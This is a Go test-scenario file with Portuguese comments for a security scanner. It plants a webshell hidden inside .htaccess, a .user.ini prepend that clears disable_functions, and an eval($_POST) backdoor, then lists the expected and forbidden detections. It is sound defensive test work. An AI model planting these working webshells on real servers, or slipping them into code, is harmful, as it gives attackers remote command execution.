package scenario

// O webshell que cabe no arquivo de configuração.
//
// É a forma mais econômica que existe, e ela passava por baixo dos DOIS lados
// desta ferramenta ao mesmo tempo:
//
//	o coletor de gatilhos procurava `auto_prepend_file` só em /etc/php*
//	a varredura de código seleciona por EXTENSÃO, e `.htaccess` não tem uma
//
// O plantio abaixo é o htshell (justanotherhacker.com), copiado na estrutura em
// que ele circula: três diretivas e uma linha de código escondida atrás de um
// `#`. O `#` é o ponto do truque — ele faz o Apache IGNORAR a linha ao ler a
// configuração, e o interpretador não sabe nada de `#` quando o MESMO arquivo é
// servido como PHP.
//
// Ao lado dele vai um `.htaccess` NORMAL, desses que existem em toda aplicação
// PHP do mundo. Ele é metade do cenário: se a ferramenta acusasse os dois, o
// achado não valeria nada numa frota — todo host com PHP sairia vermelho, e o
// operador aprenderia a ignorar a saída inteira.
const configWebPlantada = `mkdir -p /var/www/html/uploads /var/www/html/app
	printf '<Files ~ "^\\.ht">\nOrder allow,deny\nAllow from all\n</Files>\n\nAddType application/x-httpd-php .htaccess\n\n###### SHELL ###### <?php echo "\\n";passthru($_GET["c"]." 2>&1"); ?>###### LLEHS ######\n' > /var/www/html/.htaccess
	printf 'auto_prepend_file = /var/www/html/uploads/.i.php\ndisable_functions =\n' > /var/www/html/uploads/.user.ini
	printf '<?php @eval($_POST["x"]); ?>\n' > /var/www/html/uploads/.i.php
	printf 'RewriteEngine On\nRewriteCond %%{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA,L]\nAddHandler application/x-httpd-php74 .php\n' > /var/www/html/app/.htaccess
	printf '<?php phpinfo();\n' > /var/www/html/app/index.php
	sleep 0.2`

func init() {
	Register(Scenario{
		ID:     "WC1-webshell-no-proprio-htaccess",
		Desc:   "o webshell inteiro dentro do .htaccess: nenhum .php novo no docroot, e o arquivo de configuração é ao mesmo tempo o que o torna executável e o payload",
		Images: matriz,
		Plant:  configWebPlantada,
		Expect: []Expect{
			// 1. O MAPEAMENTO. É ele que transforma o arquivo de configuração em
			// programa, e é a única das três linhas que não tem disfarce.
			{ID: "app.web_config_exec", Sev: "CRITICAL",
				Subject: "/var/www/html/.htaccess", Evidence: "PRÓPRIO arquivo de configuração"},
			// 2. O CÓDIGO, que está atrás de um `#` e por isso não é comentário
			// para quem importa.
			{ID: "app.web_config_exec", Sev: "CRITICAL",
				Subject: "/var/www/html/.htaccess", Evidence: "configuração de servidor não contém"},
			// 3. A EXPOSIÇÃO. Sem ela o código está plantado e responde 403: é a
			// diferença entre alcançável e inerte, e ela muda a urgência.
			{ID: "app.web_config_exec", Sev: "CRITICAL",
				Subject: "/var/www/html/.htaccess", Evidence: "negação de fábrica"},

			// O .user.ini é a MESMA diretiva do php.ini num arquivo que quem faz
			// upload consegue escrever — e apontando para dentro da árvore de
			// upload, que é onde bootstrap de framework não mora.
			{ID: "persist.web_prepend", Sev: "CRITICAL",
				Evidence: "árvore de UPLOAD"},
			{ID: "app.web_config_exec", Sev: "CRITICAL",
				Subject: "/var/www/html/uploads/.user.ini", Evidence: "lista de funções proibidas foi zerada"},

			// E a OUTRA metade do conserto: o arquivo agora chega ao motor de
			// código. Ele só chega porque TEM tag de PHP — um .htaccess comum
			// continua fora, senão a máquina de máscara analisaria diretiva de
			// Apache como se fosse fonte.
			{ID: "app.code_backdoor", Subject: "/var/www/html/.htaccess"},
		},
		// O .htaccess NORMAL não pode virar achado. `AddHandler
		// application/x-httpd-php74 .php` é o que hospedagem compartilhada
		// escreve para escolher a versão do interpretador, e RewriteRule é o
		// front controller de qualquer framework.
		ForbidFinding: []Expect{
			{ID: "app.web_config_exec", Subject: "/var/www/html/app/.htaccess"},
		},
		Exit: 2,
	})
}
